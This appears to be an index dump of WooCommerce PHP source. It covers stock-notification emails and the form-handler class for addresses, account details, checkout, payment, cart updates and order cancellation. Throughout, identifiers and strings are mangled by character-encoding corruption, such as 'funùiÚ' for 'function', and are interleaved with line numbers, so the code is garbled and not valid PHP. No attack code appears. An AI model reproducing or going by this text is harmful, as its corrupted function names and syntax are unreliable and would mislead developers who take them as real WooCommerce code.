$v®ue
 ) {

313 
echo
 '<p><¡rÚg>' . 
$key
 . ':</¡rÚg> ' . 
$v®ue
 . '</p>';

318 
	}
}

327 
funùiÚ
 
	$low_¡ock
Ğ
$´oduù
 ) {

329 
$blogÇme
 = 
	`wp_¥ecŸlch¬s_decode
(
	`g‘_İtiÚ
('blogÇme'), 
ENT_QUOTES
);

331 
$subjeù
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_ema_subjeù_low_¡ock', 
	`¥rštf
Ğ'[%s] %s', 
$blogÇme
, 
	`__
Ğ'Produù†ow iÀ¡ock', 'woocomm”û' ) ), 
$´oduù
 );

333 
$sku
 = (
$´oduù
->
sku
) ? '(' . $product->sku . ') ' : '';

335 iàĞ! 
	`em±y
Ğ
$´oduù
->
v¬ŸtiÚ_id
 ) )

336 
$t™Ë
 = 
	`¥rštf
(
	`__
Ğ'V¬ŸtiÚ #% oà%s', 'woocomm”û' ), 
$´oduù
->
v¬ŸtiÚ_id
, 
	`g‘_the_t™Ë
($´oduù->
id
)è. ' ' . 
$sku
;

338 
$t™Ë
 = 
	`¥rštf
(
	`__
Ğ'Produù #% - %s', 'woocomm”û' ), 
$´oduù
->
id
, 
	`g‘_the_t™Ë
($´oduù->id)è. ' ' . 
$sku
;

340 
$mes§ge
 = 
$t™Ë
 . 
	`__
( 'is†ow in stock.', 'woocommerce' );

343 
$h—d”s
 = 
	`­¶y_f‹rs
('woocomm”û_ema_h—d”s', '', 'low_¡ock', 
$´oduù
);

346 
$©chm’ts
 = 
	`­¶y_f‹rs
('woocomm”û_ema_©chm’ts', '', 'low_¡ock', 
$´oduù
);

349 
	`wp_ma
Ğ
	`g‘_İtiÚ
('woocomm”û_¡ock_ema_»c›Á'), 
$subjeù
, 
$mes§ge
, 
$h—d”s
, 
$©chm’ts
 );

350 
	}
}

359 
funùiÚ
 
	$no_¡ock
Ğ
$´oduù
 ) {

361 
$blogÇme
 = 
	`wp_¥ecŸlch¬s_decode
(
	`g‘_İtiÚ
('blogÇme'), 
ENT_QUOTES
);

363 
$subjeù
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_ema_subjeù_no_¡ock', 
	`¥rštf
Ğ'[%s] %s', 
$blogÇme
, 
	`__
Ğ'Produù ouˆoà¡ock', 'woocomm”û' ) ), 
$´oduù
 );

365 
$sku
 = (
$´oduù
->
sku
) ? '(' . $product->sku . ') ' : '';

367 iàĞ! 
	`em±y
Ğ
$´oduù
->
v¬ŸtiÚ_id
 ) )

368 
$t™Ë
 = 
	`¥rštf
(
	`__
Ğ'V¬ŸtiÚ #% oà%s', 'woocomm”û' ), 
$´oduù
->
v¬ŸtiÚ_id
, 
	`g‘_the_t™Ë
($´oduù->
id
)è. ' ' . 
$sku
;

370 
$t™Ë
 = 
	`¥rštf
(
	`__
Ğ'Produù #% - %s', 'woocomm”û' ), 
$´oduù
->
id
, 
	`g‘_the_t™Ë
($´oduù->id)è. ' ' . 
$sku
;

372 
$mes§ge
 = 
$t™Ë
 . 
	`__
( 'is out of stock.', 'woocommerce' );

375 
$h—d”s
 = 
	`­¶y_f‹rs
('woocomm”û_ema_h—d”s', '', 'no_¡ock', 
$´oduù
);

378 
$©chm’ts
 = 
	`­¶y_f‹rs
('woocomm”û_ema_©chm’ts', '', 'no_¡ock', 
$´oduù
);

381 
	`wp_ma
Ğ
	`g‘_İtiÚ
('woocomm”û_¡ock_ema_»c›Á'), 
$subjeù
, 
$mes§ge
, 
$h—d”s
, 
$©chm’ts
 );

382 
	}
}

391 
funùiÚ
 
	$backÜd”
Ğ
$¬gs
 ) {

393 
$deçuÉs
 = 
	`¬¿y
(

399 
$¬gs
 = 
	`wp_·r£_¬gs
Ğ$¬gs, 
$deçuÉs
 );

401 
	`exŒaù
Ğ
$¬gs
 );

403 ià(!
$´oduù
 || !
$quªt™y
) ;

405 
$blogÇme
 = 
	`wp_¥ecŸlch¬s_decode
(
	`g‘_İtiÚ
('blogÇme'), 
ENT_QUOTES
);

407 
$subjeù
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_ema_subjeù_backÜd”', 
	`¥rštf
Ğ'[%s] %s', 
$blogÇme
, 
	`__
Ğ'Produù BackÜd”', 'woocomm”û' ) ), 
$´oduù
 );

409 
$sku
 = (
$´oduù
->
sku
) ? ' (' . $product->sku . ')' : '';

411 iàĞ! 
	`em±y
Ğ
$´oduù
->
v¬ŸtiÚ_id
 ) )

412 
$t™Ë
 = 
	`¥rštf
(
	`__
Ğ'V¬ŸtiÚ #% oà%s', 'woocomm”û' ), 
$´oduù
->
v¬ŸtiÚ_id
, 
	`g‘_the_t™Ë
($´oduù->
id
)è. 
$sku
;

414 
$t™Ë
 = 
	`¥rštf
(
	`__
Ğ'Produù #% - %s', 'woocomm”û' ), 
$´oduù
->
id
, 
	`g‘_the_t™Ë
($´oduù->id)è. 
$sku
;

416 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$Üd”_id
 );

417 
$mes§ge
 = 
	`¥rštf
(
	`__
Ğ'% un™ oà% havb“ÀbackÜd”ed iÀÜd” %s.', 'woocomm”û' ), 
$quªt™y
, 
$t™Ë
, 
$Üd”
->
	`g‘_Üd”_numb”
() );

420 
$h—d”s
 = 
	`­¶y_f‹rs
('woocomm”û_ema_h—d”s', '', 'backÜd”', 
$¬gs
);

423 
$©chm’ts
 = 
	`­¶y_f‹rs
('woocomm”û_ema_©chm’ts', '', 'backÜd”', 
$¬gs
);

426 
	`wp_ma
Ğ
	`g‘_İtiÚ
('woocomm”û_¡ock_ema_»c›Á'), 
$subjeù
, 
$mes§ge
, 
$h—d”s
, 
$©chm’ts
 );

427 
	}
}

	@includes/class-wc-form-handler.php

1 <?
php


3 iàĞ! 
defšed
( 'ABSPATH' ) ) {

4 
	gex™
;

16 şas 
	cWC_FÜm_HªdËr
 {

21 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

22 
	`add_aùiÚ
Ğ'‹m¶©e_»dœeù', 
	`¬¿y
Ğ
$this
, 'save_address' ) );

23 
	`add_aùiÚ
Ğ'‹m¶©e_»dœeù', 
	`¬¿y
Ğ
$this
, 'save_account_details' ) );

25 
	`add_aùiÚ
Ğ'š™', 
	`¬¿y
Ğ
$this
, 'checkout_action' ), 20 );

26 
	`add_aùiÚ
Ğ'š™', 
	`¬¿y
Ğ
$this
, 'process_login' ) );

27 
	`add_aùiÚ
Ğ'š™', 
	`¬¿y
Ğ
$this
, 'process_registration' ) );

28 
	`add_aùiÚ
Ğ'š™', 
	`¬¿y
Ğ
$this
, 'process_reset_password' ) );

30 
	`add_aùiÚ
Ğ'š™', 
	`¬¿y
Ğ
$this
, 'cancel_order' ) );

31 
	`add_aùiÚ
Ğ'š™', 
	`¬¿y
Ğ
$this
, 'order_again' ) );

33 
	`add_aùiÚ
Ğ'š™', 
	`¬¿y
Ğ
$this
, 'update_cart_action' ) );

34 
	`add_aùiÚ
Ğ'š™', 
	`¬¿y
Ğ
$this
, 'add_to_cart_action' ) );

36 
	`add_aùiÚ
Ğ'wp', 
	`¬¿y
Ğ
$this
, 'pay_action' ), 20 );

37 
	`add_aùiÚ
Ğ'wp', 
	`¬¿y
Ğ
$this
, 'add_payment_method_action' ), 20 );

44 
public
 
funùiÚ
 
	$§ve_add»ss
() {

45 
glob®
 
$woocomm”û
, 
$wp
;

47 iàĞ'POST' !=ğ
	`¡¹ouµ”
Ğ
$_SERVER
[ 'REQUEST_METHOD' ] ) ) {

51 iàĞ
	`em±y
Ğ
$_POST
[ 'action' ] ) || ( 'edit_address' !== $_POST[ 'action' ] ) ||ƒmpty( $_POST['_wpnonce'] ) ) {

55 
	`wp_v”ify_nÚû
Ğ
$_POST
['_wpnonce'], 'woocommerce-edit_address' );

57 
$u£r_id
 = 
	`g‘_cu¼’t_u£r_id
();

59 iàĞ
$u£r_id
 <= 0 ) {

63 
$lßd_add»ss
 = 
	`is£t
Ğ
$wp
->
qu”y_v¬s
['ed™-add»ss'] ) ? 
	`§n™ize_key
( $wp->query_vars['edit-address'] ) : 'billing';

65 
$add»ss
 = 
	`WC
()->
couÁr›s
->
	`g‘_add»ss_f›lds
Ğ
	`esc_©Œ
Ğ
$_POST
[ 
$lßd_add»ss
 . '_country' ] ), $load_address . '_' );

67 
	`fÜ—ch
 ( 
$add»ss
 
as
 
$key
 => 
$f›ld
 ) {

69 iàĞ! 
	`is£t
Ğ
$f›ld
['type'] ) ) {

70 
$f›ld
['type'] = 'text';

74  
$f›ld
['type'] ) {

76 
$_POST
[ 
$key
 ] = 
	`is£t
( $_POST[ $key ] ) ? 1 : 0;

79 
$_POST
[ 
$key
 ] = 
	`is£t
Ğ$_POST[ $key ] ) ? 
	`wc_ş—n
( $_POST[ $key ] ) : '';

84 
$_POST
[ 
$key
 ] = 
	`­¶y_f‹rs
( 'woocommerce_process_myaccount_field_' . $key, $_POST[ $key ] );

87 iàĞ! 
	`em±y
Ğ
$f›ld
['»quœed'] ) &&ƒm±yĞ
$_POST
[ 
$key
 ] ) ) {

88 
	`wc_add_nÙiû
Ğ
$f›ld
['Ïb–'] . ' ' . 
	`__
( 'is‡„equired field.', 'woocommerce' ), 'error' );

92 iàĞ! 
	`em±y
Ğ
$f›ld
['v®id©e'] ) && 
	`is_¬¿y
( $field['validate'] ) ) {

93 
	`fÜ—ch
 ( 
$f›ld
['v®id©e'] 
as
 
$ruË
 ) {

94  
$ruË
 ) {

96 
$_POST
[ 
$key
 ] = 
	`¡¹ouµ”
Ğ
	`¡r_»¶aû
( ' ', '', $_POST[ $key ] ) );

98 iàĞ! 
WC_V®id©iÚ
::
	`is_po¡code
Ğ
$_POST
[ 
$key
 ], $_POST[ 
$lßd_add»ss
 . '_country' ] ) ) {

99 
	`wc_add_nÙiû
Ğ
	`__
( 'Pleaseƒnter‡ valid…ostcode/ZIP.', 'woocommerce' ), 'error' );

101 
$_POST
[ 
$key
 ] = 
	`wc_fÜm©_po¡code
Ğ$_POST[ $key ], $_POST[ 
$lßd_add»ss
 . '_country' ] );

105 
$_POST
[ 
$key
 ] = 
	`wc_fÜm©_phÚe_numb”
( $_POST[ $key ] );

107 iàĞ! 
WC_V®id©iÚ
::
	`is_phÚe
Ğ
$_POST
[ 
$key
 ] ) ) {

108 
	`wc_add_nÙiû
Ğ'<¡rÚg>' . 
$f›ld
['Ïb–'] . '</¡rÚg> ' . 
	`__
( 'is‚ot‡ valid…hone‚umber.', 'woocommerce' ), 'error' );

112 
$_POST
[ 
$key
 ] = 
	`¡¹Şow”
( $_POST[ $key ] );

114 iàĞ! 
	`is_ema
Ğ
$_POST
[ 
$key
 ] ) ) {

115 
	`wc_add_nÙiû
Ğ'<¡rÚg>' . 
$f›ld
['Ïb–'] . '</¡rÚg> ' . 
	`__
( 'is‚ot‡ validƒmail‡ddress.', 'woocommerce' ), 'error' );

123 iàĞ
	`wc_nÙiû_couÁ
( 'error' ) == 0 ) {

125 
	`fÜ—ch
 ( 
$add»ss
 
as
 
$key
 => 
$f›ld
 ) {

126 
	`upd©e_u£r_m‘a
Ğ
$u£r_id
, 
$key
, 
$_POST
[ $key ] );

129 
	`wc_add_nÙiû
Ğ
	`__
( 'Address changed successfully.', 'woocommerce' ) );

131 
	`do_aùiÚ
Ğ'woocomm”û_cu¡om”_§ve_add»ss', 
$u£r_id
, 
$lßd_add»ss
 );

133 
	`wp_§ã_»dœeù
Ğ
	`g‘_³rm®šk
Ğ
	`wc_g‘_·ge_id
('myaccount') ) );

134 
ex™
;

136 
	}
}

141 
public
 
funùiÚ
 
	$§ve_accouÁ_d‘as
() {

143 iàĞ'POST' !=ğ
	`¡¹ouµ”
Ğ
$_SERVER
[ 'REQUEST_METHOD' ] ) ) {

147 iàĞ
	`em±y
Ğ
$_POST
[ 'action' ] ) || ( 'save_account_details' !== $_POST[ 'action' ] ) ||ƒmpty( $_POST['_wpnonce'] ) ) {

151 
	`wp_v”ify_nÚû
Ğ
$_POST
['_wpnonce'], 'woocommerce-save_account_details' );

153 
$upd©e
 = 
Œue
;

154 
$”rÜs
 = 
Ãw
 
	`WP_E¼Ü
();

155 
$u£r
 = 
Ãw
 
	`¡dCÏss
();

157 
$u£r
->
ID
 = (è
	`g‘_cu¼’t_u£r_id
();

158 
$cu¼’t_u£r
 = 
	`g‘_u£r_by
Ğ'id', 
$u£r
->
ID
 );

160 iàĞ
$u£r
->
ID
 <= 0 ) {

164 
$accouÁ_fœ¡_Çme
 = ! 
	`em±y
Ğ
$_POST
[ 'accouÁ_fœ¡_Çme' ] ) ? 
	`wc_ş—n
( $_POST[ 'account_first_name' ] ) : '';

165 
$accouÁ_Ï¡_Çme
 = ! 
	`em±y
Ğ
$_POST
[ 'accouÁ_Ï¡_Çme' ] ) ? 
	`wc_ş—n
( $_POST[ 'account_last_name' ] ) : '';

166 
$accouÁ_ema
 = ! 
	`em±y
Ğ
$_POST
[ 'accouÁ_ema' ] ) ? 
	`§n™ize_ema
( $_POST[ 'account_email' ] ) : '';

167 
$·ss1
 = ! 
	`em±y
Ğ
$_POST
[ 'password_1' ] ) ? $_POST[ 'password_1' ] : '';

168 
$·ss2
 = ! 
	`em±y
Ğ
$_POST
[ 'password_2' ] ) ? $_POST[ 'password_2' ] : '';

170 
$u£r
->
fœ¡_Çme
 = 
$accouÁ_fœ¡_Çme
;

171 
$u£r
->
Ï¡_Çme
 = 
$accouÁ_Ï¡_Çme
;

172 
$u£r
->
u£r_ema
 = 
$accouÁ_ema
;

173 
$u£r
->
di¥Ïy_Çme
 = $u£r->
fœ¡_Çme
;

175 iàĞ
$·ss1
 ) {

176 
$u£r
->
u£r_·ss
 = 
$·ss1
;

179 iàĞ
	`em±y
Ğ
$accouÁ_fœ¡_Çme
 ) ||ƒm±yĞ
$accouÁ_Ï¡_Çme
 ) ) {

180 
	`wc_add_nÙiû
Ğ
	`__
( 'Pleaseƒnter your‚ame.', 'woocommerce' ), 'error' );

183 iàĞ
	`em±y
Ğ
$accouÁ_ema
 ) || ! 
	`is_ema
( $account_email ) ) {

184 
	`wc_add_nÙiû
Ğ
	`__
( 'Please…rovide‡ validƒmail‡ddress.', 'woocommerce' ), 'error' );

185 } 
	`–£if
 ( 
	`ema_exi¡s
Ğ
$accouÁ_ema
 ) && $accouÁ_ema !=ğ
$cu¼’t_u£r
->
u£r_ema
 ) {

186 
	`wc_add_nÙiû
Ğ
	`__
( 'Thisƒmail‡ddress is‡lready„egistered.', 'woocommerce' ), 'error' );

189 iàĞ! 
	`em±y
Ğ
$·ss1
 ) &&ƒm±yĞ
$·ss2
 ) ) {

190 
	`wc_add_nÙiû
Ğ
	`__
( 'Please„e-enter your…assword.', 'woocommerce' ), 'error' );

191 } 
	`–£if
 ( ! 
	`em±y
Ğ
$·ss1
 ) && $·ss1 !=ğ
$·ss2
 ) {

192 
	`wc_add_nÙiû
Ğ
	`__
( 'Passwords do‚ot match.', 'woocommerce' ), 'error' );

196 
	`do_aùiÚ_»f_¬¿y
Ğ'u£r_´ofe_upd©e_”rÜs', 
	`¬¿y
 ( &
$”rÜs
, 
$upd©e
, &
$u£r
 ) );

198 iàĞ
$”rÜs
->
	`g‘_”rÜ_mes§ges
() ) {

199 
	`fÜ—ch
 ( 
$”rÜs
->
	`g‘_”rÜ_mes§ges
(è
as
 
$”rÜ
 ) {

200 
	`wc_add_nÙiû
Ğ
$”rÜ
, 'error' );

204 iàĞ
	`wc_nÙiû_couÁ
( 'error' ) == 0 ) {

206 
	`wp_upd©e_u£r
Ğ
$u£r
 ) ;

208 
	`wc_add_nÙiû
Ğ
	`__
( 'Account details changed successfully.', 'woocommerce' ) );

210 
	`do_aùiÚ
Ğ'woocomm”û_§ve_accouÁ_d‘as', 
$u£r
->
ID
 );

212 
	`wp_§ã_»dœeù
Ğ
	`g‘_³rm®šk
Ğ
	`wc_g‘_·ge_id
( 'myaccount' ) ) );

213 
ex™
;

215 
	}
}

220 
public
 
funùiÚ
 
	$checkout_aùiÚ
() {

221 iàĞ
	`is£t
Ğ
$_POST
['woocommerce_checkout_place_order'] ) || isset( $_POST['woocommerce_checkout_update_totals'] ) ) {

223 iàĞĞ
	`WC
()->
ÿ¹
->
	`g‘_ÿ¹
() ) == 0 ) {

224 
	`wp_»dœeù
Ğ
	`g‘_³rm®šk
Ğ
	`wc_g‘_·ge_id
( 'cart' ) ) );

225 
ex™
;

228 iàĞ! 
	`defšed
( 'WOOCOMMERCE_CHECKOUT' ) ) {

229 
	`defše
Ğ'WOOCOMMERCE_CHECKOUT', 
Œue
 );

232 
$woocomm”û_checkout
 = 
	`WC
()->
	`checkout
();

233 
$woocomm”û_checkout
->
	`´oûss_checkout
();

235 
	}
}

240 
public
 
funùiÚ
 
	$·y_aùiÚ
() {

241 
glob®
 
$wp
;

243 iàĞ
	`is£t
Ğ
$_POST
['woocomm”û_·y'] ) && is£tĞ$_POST['_w²Úû'] ) && 
	`wp_v”ify_nÚû
( $_POST['_wpnonce'], 'woocommerce-pay' ) ) {

245 
	`ob_¡¬t
();

248 
$Üd”_key
 = 
$_GET
['key'];

249 
$Üd”_id
 = 
	`absšt
Ğ
$wp
->
qu”y_v¬s
['order-pay'] );

250 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$Üd”_id
 );

252 iàĞ
$Üd”
->
id
 =ğ
$Üd”_id
 && $Üd”->
Üd”_key
 =ğ
$Üd”_key
 && 
	`š_¬¿y
Ğ$Üd”->
¡©us
, 
	`¬¿y
( 'pending', 'failed' ) ) ) {

255 iàĞ
$Üd”
->
blšg_couÁry
 ) {

256 
	`WC
()->
cu¡om”
->
	`£t_couÁry
Ğ
$Üd”
->
blšg_couÁry
 );

258 iàĞ
$Üd”
->
blšg_¡©e
 ) {

259 
	`WC
()->
cu¡om”
->
	`£t_¡©e
Ğ
$Üd”
->
blšg_¡©e
 );

261 iàĞ
$Üd”
->
blšg_po¡code
 ) {

262 
	`WC
()->
cu¡om”
->
	`£t_po¡code
Ğ
$Üd”
->
blšg_po¡code
 );

264 iàĞ
$Üd”
->
blšg_c™y
 ) {

265 
	`WC
()->
cu¡om”
->
	`£t_c™y
Ğ
$Üd”
->
blšg_c™y
 );

269 iàĞ
$Üd”
->
	`Ãeds_·ym’t
() ) {

270 
$·ym’t_m‘hod
 = 
	`wc_ş—n
Ğ
$_POST
['payment_method'] );

272 
$avaabË_g©eways
 = 
	`WC
()->
·ym’t_g©eways
->
	`g‘_avaabË_·ym’t_g©eways
();

275 
	`upd©e_po¡_m‘a
Ğ
$Üd”_id
, '_·ym’t_m‘hod', 
$·ym’t_m‘hod
 );

277 iàĞ
	`is£t
Ğ
$avaabË_g©eways
[ 
$·ym’t_m‘hod
 ] ) ) {

278 
$·ym’t_m‘hod_t™Ë
 = 
$avaabË_g©eways
[ 
$·ym’t_m‘hod
 ]->
	`g‘_t™Ë
();

281 
	`upd©e_po¡_m‘a
Ğ
$Üd”_id
, '_·ym’t_m‘hod_t™Ë', 
$·ym’t_m‘hod_t™Ë
);

284 
$avaabË_g©eways
[ 
$·ym’t_m‘hod
 ]->
	`v®id©e_f›lds
();

287 iàĞ
	`wc_nÙiû_couÁ
( 'error' ) == 0 ) {

289 
$»suÉ
 = 
$avaabË_g©eways
[ 
$·ym’t_m‘hod
 ]->
	`´oûss_·ym’t
Ğ
$Üd”_id
 );

292 iàĞ'sucûss' =ğ
$»suÉ
['result'] ) {

293 
	`wp_»dœeù
Ğ
$»suÉ
['redirect'] );

294 
ex™
;

301 
$Üd”
->
	`·ym’t_com¶‘e
();

302 
	`wp_§ã_»dœeù
Ğ
$Üd”
->
	`g‘_checkout_Üd”_»ûived_u¾
() );

303 
ex™
;

309 
	}
}

314 
public
 
funùiÚ
 
	$add_·ym’t_m‘hod_aùiÚ
() {

315 
glob®
 
$wp
;

317 iàĞ
	`is£t
Ğ
$_POST
['woocomm”û_add_·ym’t_m‘hod'] ) && is£tĞ$_POST['_w²Úû'] ) && 
	`wp_v”ify_nÚû
( $_POST['_wpnonce'], 'woocommerce-add-payment-method' ) ) {

319 
	`ob_¡¬t
();

321 
$·ym’t_m‘hod
 = 
	`wc_ş—n
Ğ
$_POST
['payment_method'] );

323 
$avaabË_g©eways
 = 
	`WC
()->
·ym’t_g©eways
->
	`g‘_avaabË_·ym’t_g©eways
();

326 
$avaabË_g©eways
[ 
$·ym’t_m‘hod
 ]->
	`v®id©e_f›lds
();

329 iàĞ
	`wc_”rÜ_couÁ
() == 0 ) {

330 
$»suÉ
 = 
$avaabË_g©eways
[ 
$·ym’t_m‘hod
 ]->
	`add_·ym’t_m‘hod
();

333 iàĞ
$»suÉ
['result'] == 'success' ) {

334 
	`wc_add_mes§ge
Ğ
	`__
( 'Payment method‡dded.', 'woocommerce' ) );

335 
	`wp_»dœeù
Ğ
$»suÉ
['redirect'] );

336 
	`ex™
();

343 
	}
}

348 
public
 
funùiÚ
 
	$upd©e_ÿ¹_aùiÚ
() {

351 iàĞ! 
	`em±y
Ğ
$_POST
['apply_coupon'] ) && !ƒmpty( $_POST['coupon_code'] ) ) {

352 
	`WC
()->
ÿ¹
->
	`add_discouÁ
Ğ
	`§n™ize_‹xt_f›ld
Ğ
$_POST
['coupon_code'] ) );

356 
	`–£if
 ( 
	`is£t
Ğ
$_GET
['remove_coupon'] ) ) {

358 
	`WC
()->
ÿ¹
->
	`»move_coupÚ
Ğ
	`wc_ş—n
Ğ
$_GET
['remove_coupon'] ) );

363 
	`–£if
 ( ! 
	`em±y
Ğ
$_GET
['»move_™em'] ) && 
	`is£t
Ğ$_GET['_w²Úû'] ) && 
	`wp_v”ify_nÚû
( $_GET['_wpnonce'], 'woocommerce-cart' ) ) {

365 
	`WC
()->
ÿ¹
->
	`£t_quªt™y
Ğ
$_GET
['remove_item'], 0 );

367 
	`wc_add_nÙiû
Ğ
	`__
( 'Cart updated.', 'woocommerce' ) );

369 
$»ã»r
 = 
	`wp_g‘_»ã»r
(è? wp_g‘_»ã»r(è: 
	`WC
()->
ÿ¹
->
	`g‘_ÿ¹_u¾
();

370 
	`wp_§ã_»dœeù
Ğ
$»ã»r
 );

371 
ex™
;

376 iàĞĞ! 
	`em±y
Ğ
$_POST
['­¶y_coupÚ'] ) || !ƒm±yĞ$_POST['upd©e_ÿ¹'] ) || !ƒm±yĞ$_POST['´oûed'] ) ) && 
	`is£t
Ğ$_POST['_w²Úû'] ) && 
	`wp_v”ify_nÚû
( $_POST['_wpnonce'], 'woocommerce-cart' ) ) {

378 
$ÿ¹_upd©ed
 = 
çl£
;

379 
$ÿ¹_tÙ®s
 = 
	`is£t
Ğ
$_POST
['cart'] ) ? $_POST['cart'] : '';

381 iàĞĞ
	`WC
()->
ÿ¹
->
	`g‘_ÿ¹
() ) > 0 ) {

382 
	`fÜ—ch
 ( 
	`WC
()->
ÿ¹
->
	`g‘_ÿ¹
(è
as
 
$ÿ¹_™em_key
 => 
$v®ues
 ) {

384 
$_´oduù
 = 
$v®ues
['data'];

387 iàĞ! 
	`is£t
Ğ
$ÿ¹_tÙ®s
[ 
$ÿ¹_™em_key
 ]['qty'] ) ) {

392 
$quªt™y
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_¡ock_amouÁ_ÿ¹_™em',‡µly_f‹rsĞ'woocomm”û_¡ock_amouÁ', 
	`´eg_»¶aû
Ğ"/[^0-9\.]/", '', 
$ÿ¹_tÙ®s
[ 
$ÿ¹_™em_key
 ]['qty'] ) ), $cart_item_key );

394 iàĞ'' ==ğ
$quªt™y
 || $quªt™y =ğ
$v®ues
['quantity'] )

398 
$·s£d_v®id©iÚ
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_upd©e_ÿ¹_v®id©iÚ', 
Œue
, 
$ÿ¹_™em_key
, 
$v®ues
, 
$quªt™y
 );

401 iàĞ
$_´oduù
->
	`is_sŞd_šdividu®ly
(è&& 
$quªt™y
 > 1 ) {

402 
	`wc_add_nÙiû
Ğ
	`¥rštf
Ğ
	`__
Ğ'You cª oÆy hav1 % š you¸ÿ¹.', 'woocomm”û' ), 
$_´oduù
->
	`g‘_t™Ë
() ), 'error' );

403 
$·s£d_v®id©iÚ
 = 
çl£
;

406 iàĞ
$·s£d_v®id©iÚ
 ) {

407 
	`WC
()->
ÿ¹
->
	`£t_quªt™y
Ğ
$ÿ¹_™em_key
, 
$quªt™y
, 
çl£
 );

410 
$ÿ¹_upd©ed
 = 
Œue
;

415 
$ÿ¹_upd©ed
 = 
	`­¶y_f‹rs
( 'woocommerce_update_cart_action_cart_updated', $cart_updated );

417 iàĞ
$ÿ¹_upd©ed
 ) {

419 
	`WC
()->
ÿ¹
->
	`ÿlcuÏ‹_tÙ®s
();

422 iàĞ! 
	`em±y
Ğ
$_POST
['proceed'] ) ) {

423 
	`wp_§ã_»dœeù
Ğ
	`WC
()->
ÿ¹
->
	`g‘_checkout_u¾
() );

424 
ex™
;

425 } 
	`–£if
 ( 
$ÿ¹_upd©ed
 ) {

426 
	`wc_add_nÙiû
Ğ
	`__
( 'Cart updated.', 'woocommerce' ) );

428 
$»ã»r
 = ( 
	`wp_g‘_»ã»r
(èè? wp_g‘_»ã»r(è: 
	`WC
()->
ÿ¹
->
	`g‘_ÿ¹_u¾
();

429 
$»ã»r
 = 
	`»move_qu”y_¬g
( 'remove_coupon', $referer );

430 
	`wp_§ã_»dœeù
Ğ
$»ã»r
 );

431 
ex™
;

434 
	}
}

439 
public
 
funùiÚ
 
	$Üd”_agaš
() {

442 iàĞ! 
	`is£t
Ğ
$_GET
['Üd”_agaš'] ) || ! 
	`is_u£r_logged_š
(è|| ! is£tĞ$_GET['_w²Úû'] ) || ! 
	`wp_v”ify_nÚû
( $_GET['_wpnonce'], 'woocommerce-order_again' ) ) {

447 
	`WC
()->
ÿ¹
->
	`em±y_ÿ¹
();

450 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
	`absšt
Ğ
$_GET
['order_again'] ) );

452 iàĞ
	`em±y
Ğ
$Üd”
->
id
 ) ) {

456 iàĞ'com¶‘ed' !ğ
$Üd”
->
¡©us
 ) {

462 iàĞ! 
	`cu¼’t_u£r_ÿn
Ğ'Üd”_agaš', 
$Üd”
->
id
 ) ) {

467 
	`fÜ—ch
 ( 
$Üd”
->
	`g‘_™ems
(è
as
 
$™em
 ) {

469 
$´oduù_id
 = (è
	`­¶y_f‹rs
Ğ'woocomm”û_add_to_ÿ¹_´oduù_id', 
$™em
['product_id'] );

470 
$quªt™y
 = (è
$™em
['qty'];

471 
$v¬ŸtiÚ_id
 = (è
$™em
['variation_id'];

472 
$v¬ŸtiÚs
 = 
	`¬¿y
();

473 
$ÿ¹_™em_d©a
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_Üd”_agaš_ÿ¹_™em_d©a', 
	`¬¿y
(), 
$™em
, 
$Üd”
 );

475 
	`fÜ—ch
 ( 
$™em
['™em_m‘a'] 
as
 
$m‘a_Çme
 => 
$m‘a_v®ue
 ) {

476 iàĞ
	`xÚomy_is_´oduù_©Œibu‹
Ğ
$m‘a_Çme
 ) ) {

477 
$v¬ŸtiÚs
[ 
$m‘a_Çme
 ] = 
$m‘a_v®ue
[0];

478 } 
	`–£if
 ( 
	`m‘a_is_´oduù_©Œibu‹
Ğ
$m‘a_Çme
, 
$m‘a_v®ue
, 
$´oduù_id
 ) ) {

479 
$v¬ŸtiÚs
[ 
$m‘a_Çme
 ] = 
$m‘a_v®ue
[0];

484 iàĞ! 
	`­¶y_f‹rs
Ğ'woocomm”û_add_to_ÿ¹_v®id©iÚ', 
Œue
, 
$´oduù_id
, 
$quªt™y
, 
$v¬ŸtiÚ_id
, 
$v¬ŸtiÚs
, 
$ÿ¹_™em_d©a
 ) ) {

488 
	`WC
()->
ÿ¹
->
	`add_to_ÿ¹
Ğ
$´oduù_id
, 
$quªt™y
, 
$v¬ŸtiÚ_id
, 
$v¬ŸtiÚs
, 
$ÿ¹_™em_d©a
 );

491 
	`do_aùiÚ
Ğ'woocomm”û_Üd”ed_agaš', 
$Üd”
->
id
 );

494 
	`wc_add_nÙiû
Ğ
	`__
( 'The cart has been filled withhe items from your…revious order.', 'woocommerce' ) );

495 
	`wp_§ã_»dœeù
Ğ
	`WC
()->
ÿ¹
->
	`g‘_ÿ¹_u¾
() );

496 
ex™
;

497 
	}
}

502 
public
 
funùiÚ
 
	$ÿnûl_Üd”
() {

503 iàĞ
	`is£t
Ğ
$_GET
['cancel_order'] ) && isset( $_GET['order'] ) && isset( $_GET['order_id'] ) ) {

505 
$Üd”_key
 = 
$_GET
['order'];

506 
$Üd”_id
 = 
	`absšt
Ğ
$_GET
['order_id'] );

507 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$Üd”_id
 );

508 
$u£r_ÿn_ÿnûl
 = 
	`cu¼’t_u£r_ÿn
Ğ'ÿnûl_Üd”', 
$Üd”_id
 );

509 
$Üd”_ÿn_ÿnûl
 = 
	`š_¬¿y
Ğ
$Üd”
->
¡©us
, 
	`­¶y_f‹rs
Ğ'woocomm”û_v®id_Üd”_¡©u£s_fÜ_ÿnûl', 
	`¬¿y
( 'pending', 'failed' ) ) );

510 
$»dœeù
 = 
$_GET
['redirect'];

512 iàĞ
$Üd”
->
¡©us
 == 'cancelled' ) {

514 } 
	`–£if
 ( 
$u£r_ÿn_ÿnûl
 && 
$Üd”_ÿn_ÿnûl
 && 
$Üd”
->
id
 =ğ
$Üd”_id
 && $Üd”->
Üd”_key
 =ğ
$Üd”_key
 && 
	`is£t
Ğ
$_GET
['_w²Úû'] ) && 
	`wp_v”ify_nÚû
( $_GET['_wpnonce'], 'woocommerce-cancel_order' ) ) {

517 
$Üd”
->
	`ÿnûl_Üd”
Ğ
	`__
('Order cancelled by customer.', 'woocommerce' ) );

520 
